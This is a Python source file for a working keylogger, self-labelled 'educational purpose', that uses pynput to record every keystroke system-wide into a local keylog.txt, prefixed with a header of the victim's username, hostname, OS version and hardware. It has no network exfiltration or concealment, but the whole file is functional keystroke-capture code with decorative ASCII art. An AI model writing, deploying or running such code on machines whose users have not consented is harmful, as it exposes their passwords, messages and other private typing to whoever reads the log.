#Python code for a wholesome keylogger - Daniel Edition
"""

  _____ _______    _____ _ _    _             _              _
 |_   _|__   __|  / ____(_) |  | |           | |            | |
   | |    | |    | (___  _| | _| | _____ _ __| |__   ___  __| |
   | |    | |     \___ \| | |/ / |/ / _ \ '__| '_ \ / _ \/ _` |
  _| |_   | |     ____) | |   <|   <  __/ |  | | | |  __/ (_| |
 |_____|  |_|    |_____/|_|_|\_\_|\_\___|_|  |_| |_|\___|\__,_|
  _   _      _                      _                    _  __                                     _ _         _   _                 _ _    _             _              _
 | \ | |    | |                    | |                  | |/ /                                    (_) |       | | (_)               (_) |  | |           | |            | |
 |  \| | ___| |___   ____ ____ _ __| | __   ___   __ _  | ' / ___  _ __ ___  _ __ ___  _   _ _ __  _| | ____ _| |_ _  ___  _ __  ___ _| | _| | _____ _ __| |__   ___  __| |
 | . ` |/ _ \ __\ \ / / _`  _ \ '__| |/ /  / _ \ / _` | |  < / _ \| '_ ` _ \| '_ ` _ \| | | | '_ \| | |/ / _` | __| |/ _ \| '_ \/ __| | |/ / |/ / _ \ '__| '_ \ / _ \/ _` |
 | |\  |  __/ |_ \ V / (_|  __/ |  |   <  | (_) | (_| | | . \ (_) | | | | | | | | | | | |_| | | | | |   < (_| | |_| | (_) | | | \__ \ |   <|   <  __/ |  | | | |  __/ (_| |
 |_| \_|\___|\__| \_/ \__,____|_|  |_|\_\  \___/ \__, | |_|\_\___/|_| |_| |_|_| |_| |_|\__,_|_| |_|_|_|\_\__,_|\__|_|\___/|_| |_|___/_|_|\_\_|\_\___|_|  |_| |_|\___|\__,_|
                                                  __/ |
                                                 |___/

"""
# os is for file_exists & get some system information
import os
import platform

# Import the required module for keyboard monitoring
import pynput.keyboard
from colorama import Fore, Back, Style
from datetime import datetime

# Define a class for the keylogger
class SimpleKeylogger:
    def __init__(self):
        # Initialize an empty string to store the logged keys
        self.logger = ""
        # Set the log file path
        self.log_file_path = "keylog.txt"
        self.hasExe = False

        # Check if the log file already exists
        global file_exists
        file_exists = os.path.isfile(self.log_file_path)


    # Method to create the Hashtag Header
    def write_header(self, new_file, current_datetime, username, os, node, version, machine):
        """
        Method to create the dynamic #Hashtag# Header with a bunch of info ❤️
        :param new_file: New or existing file
        :param current_datetime: strftime("%Y-%m-%d %H:%M:%S")
        :param username: Username
        :param os: Such as Linux or Windows
        :param node: Hostname
        :param version: Version of the operating system
        :param machine: Intel/AMD 32/64-bit
        """
        # Define the box width
        box_width = 82

        # Write the header
        new_file.write("#" * box_width + "\n")
        new_file.write(f"############ Log {current_datetime} | Username: {username.ljust(20)} ############\n")
        new_file.write(f"### OS: {os.ljust(7)} | Node: {node.ljust(12)} | Version: {version} | Machine: {machine.ljust(8)} ###\n")
        new_file.write("#" * box_width + "\n\n")



    # Method to create ASCII Art ⭐
    def createASCIIart(self, new_file):
        ascii_art = '''
  ______    _                 _   _                   _   _____                                 
 |  ____|  | |               | | (_)                 | | |  __ \\                                
 | |__   __| |_   _  ___ __ _| |_ _  ___  _ __   __ _| | | |__) |   _ _ __ _ __   ___  ___  ___ 
 |  __| / _` | | | |/ __/ _` | __| |/ _ \| '_ \\ / _` | | |  ___/ | | | '__| '_ \\ / _ \\/ __|/ _ \\
 | |___| (_| | |_| | (_| (_| | |_| | (_) | | | | (_| | | | |   | |_| | |  | |_) | (_) \\__ \\  __/
 |______\__,_|\\__,_|\\___\\__,_|\\__|_|\\___/|_| |_|\\__,_|_| |_|    \\__,_|_|  | .__/ \\___/|___/\\___|
  _  __          _                                                        | |                   
 | |/ /         | |                                                       |_|                   
 | ' / ___ _   _| | ___   __ _  __ _  ___ _ __                                                  
 | < /  _ \\ | | | |/ _ \\ / _` |/ _` |/ _ \\ '__|                                                 
 | . \\  __/ |_| | | (_) | (_| | (_| |  __/ |                                                    
 |_|\\_\\___|\\__, |_|\\___/ \\__, |\\__, |\\___|_|                                                    
            __/ |         __/ | __/ |                                                           
           |___/         |___/ |___/                                                            
        '''
        new_file.write(ascii_art)
        print(Fore.GREEN + ascii_art)

    # Method to append the pressed key to the log
    def append_to_log(self, key_strike):
        # Append the pressed key to the logger string
        self.logger = self.logger + key_strike

        # Get the current date and time
        current_datetime = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Open the log file in append mode and write the pressed key
        with open(self.log_file_path, "a+", encoding="utf-8") as new_file:
            # If the file already exists, add a new line before writing the pressed key
            # if file_exists & self.hasExe is not True:
            if file_exists and not self.hasExe:
                new_file.write("\n\n")
                # Generate Header
                self.write_header(new_file, current_datetime, os.getlogin(), platform.system(), platform.node(), platform.version(), platform.machine())
                self.hasExe = True
            elif not file_exists and not self.hasExe:
                new_file.write("Educational purpose Keylogger v0.34\n")
                # Generate ASCII Art, since it's a new file
                self.createASCIIart(new_file)
                new_file.write("\nMade by: Daacals\n\n")
                # Generate Header
                self.write_header(new_file, current_datetime, os.getlogin(), platform.system(), platform.node(), platform.version(), platform.machine())
                self.hasExe = True

            new_file.write(self.logger)

        # Uncomment the next line if you want to print the logger to the console
        # print(self.logger)

        # Reset the logger for the next key press
        self.logger = ""

    # Method to evaluate the pressed keys
    def evaluate_keys(self, key):
        try:
            # If the key has a character attribute, convert it to a string
            pressed_key = str(key.char)
        except AttributeError:
            # If the key does not have a character attribute
            if key == key.space:
                pressed_key = " "
            # New Logic, adding "\n" if key.enter`
            elif key == key.enter:
                pressed_key = "\n"
            else:
                pressed_key = " " + str(key) + " "

        # Call the append_to_log method to log the pressed key
        self.append_to_log(pressed_key)


    # Method to start the keylogger
    def start(self):
        # Create a keyboard listener with the evaluate_keys method as the callback
        keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)

        # Start the keyboard listener and keep running it
        with keyboard_listener:
            self.logger = ""
            keyboard_listener.join()

# Create an instance of the SimpleKeylogger class and start the keylogger
SimpleKeylogger().start()
